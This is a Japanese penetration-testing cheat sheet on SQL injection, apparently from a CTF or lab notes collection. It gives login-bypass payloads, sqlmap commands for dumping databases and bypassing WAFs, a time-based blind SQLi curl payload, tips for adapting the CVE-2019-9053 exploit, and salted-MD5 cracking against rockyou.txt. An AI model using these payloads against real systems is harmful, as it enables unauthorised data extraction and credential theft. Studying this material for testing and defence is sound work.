# SQLインジェクション（SQLi）

## 概要

WebアプリケーションのフォームやパラメータにSQL文を挿入し、データベースを不正操作する脆弱性。認証バイパス・データ抽出・コード実行につながる。

---

## 着火条件

- ログインフォームがある
- URLパラメータ（`?id=1`, `?search=foo`）でデータを取得するページがある
- エラーメッセージにSQLやデータベースの情報が含まれている

---

## 観点・着眼点

**まず手動で確認する：**
1. 入力フィールドに `'` を入力してエラーが出るか確認
2. エラーの内容からDBの種類（MySQL / MSSQL / PostgreSQL / SQLite）を推測
3. エラーが出なくても「挙動の変化」を観察する（レスポンス内容・サイズの変化）

**認証バイパスの定番：**
```
ユーザー名: admin' --
パスワード: anything

ユーザー名: ' OR '1'='1
パスワード: ' OR '1'='1
```

---

## 手順

### sqlmap による自動検出・抽出

**GETパラメータへの検査：**
```bash
sqlmap -u "http://[TARGET]/page?id=1" --batch
```

**POSTフォームへの検査：**
```bash
sqlmap -u "http://[TARGET]/login" \
  --data="username=admin&password=test" \
  --batch
```

**特定のフォームフィールドを指定：**
```bash
sqlmap -u "http://[TARGET]/login" \
  --data="username=admin&password=test" \
  -p username \
  --batch
```

**データベース・テーブル・データの抽出：**
```bash
# DB一覧
sqlmap -u "[URL]" --dbs --batch

# テーブル一覧
sqlmap -u "[URL]" -D [DB_NAME] --tables --batch

# データ抽出
sqlmap -u "[URL]" -D [DB_NAME] -T [TABLE_NAME] --dump --batch
```

**Cookieが必要な認証済みページへの検査：**
```bash
sqlmap -u "http://[TARGET]/page" \
  --cookie="session=[COOKIE_VALUE]" \
  --batch
```

---

## 注意点・落とし穴

- `--batch` を使うと全質問にデフォルト回答するので自動化しやすいが、重要な選択を見逃す場合がある
- sqlmap のデフォルトはレベル1・リスク1。検出できない場合は `--level=5 --risk=3` を試す
- WAFが存在する場合は `--tamper` オプションでバイパスを試みる
- sqlmap の出力は `--output-dir` で保存しておくと再実行が不要になる

---

## タイムベースブラインドSQLi（手動アプローチ）

### 着火条件
- エラーメッセージも差分レスポンスも出ない（完全にブラインド）が、**レスポンス時間の遅延**だけが観測できる場合
- DoS保護・WAFにより sqlmap が機能しない場合（リクエストレート制限あり）
- CVE のエクスプロイトが時間計測ベースで動作している場合

### 観点・着眼点

エラーも差分レスポンスもない状態では「**DBがスリープしているかどうか**」だけが唯一のオラクル。1文字ずつ LIKE + SLEEP でデータを抽出するため、全データ取得に時間がかかる。焦らず自動化スクリプトに任せる。

**抽出の優先順位：**
1. ソルト（`cms_siteprefs` テーブルの `sitemask` 等）
2. ユーザー名
3. メールアドレス
4. パスワードハッシュ

ハッシュよりソルトを先に取得する理由：多くのWebアプリは `md5(salt + password)` でハッシュを生成するため、ソルトなしではクラックできない。

### 手順（汎用：手動タイムベース確認 → エクスプロイトスクリプトの調整 → クラック）

```bash
# [Attacker] 脆弱性の存在確認（3秒遅延するか）
curl -s "http://[TARGET]/[エンドポイント]?[VULN_PARAM]=a,b,1,5))+and+(select+sleep(3))+--+" \
  -o /dev/null -w "%{time_total}\n"
# 3秒以上かかれば SQLi 成立
```

エクスプロイトスクリプトが見つかった場合は `searchsploit -m [PATH]` で取得し、Python 2 系であれば `print` 文の括弧化と `hashlib.md5((salt + word).encode())` への修正が必要なことが多い。

抽出後のソルト + MD5 ハッシュに対するクラックは Python の単純ループ（`hashlib.md5((salt + word).encode()).hexdigest()` を rockyou.txt の各行で計算）で実行できる。詳細フォーマットの例とアプリ × バージョン固有のペイロードは CVE_Notes.md にまとめてある：

- **CMS Made Simple ≤ 2.2.9（CVE-2019-9053）** → `../../05_Tools_Reference/CVE_Notes.md`

### 注意点・落とし穴

- **DoS保護があるサイトではリクエスト間に遅延を入れる**（`time.sleep(0.5)` 程度）。連続リクエストで接続が切られると抽出が止まる
- スリープ閾値（TIME変数）は環境のレイテンシに合わせて調整する。レイテンシが200ms以上ある場合は `TIME=5` 程度に上げる
- 文字セット（dictionary）に不足がある場合は1文字も抽出されずに終わる。エラーなく空文字が返る場合は文字セットを確認
- Python 2系のエクスプロイトは `hashlib.md5(str(salt) + word)` でバイト/文字列の混在エラーが出る。Python 3では `.encode()` が必要
- 一部のCMSはセッション管理があり、Cookieなしではクエリが実行されないことがある

---

## 関連技術

- 前：ログインフォームまたはURLパラメータを発見 → `../../01_Reconnaissance/Web_Enumeration.md`
- 関連：アプリ × バージョン固有のペイロード（CMS Made Simple 等） → `../../05_Tools_Reference/CVE_Notes.md`
- 後：認証情報が取得できた → `../Credential_Discovery.md`
- 後：MD5+Salt ハッシュのクラック → `../../05_Tools_Reference/Hashcat.md`（mode 20）
- 後：管理者パネルにアクセスできた → Webアプリ固有の機能を調査。コマンドインジェクション等を試す → `./Command_Injection.md`
- 関連：XSS（同じ入力フィールドの脆弱性） → `./XSS.md`
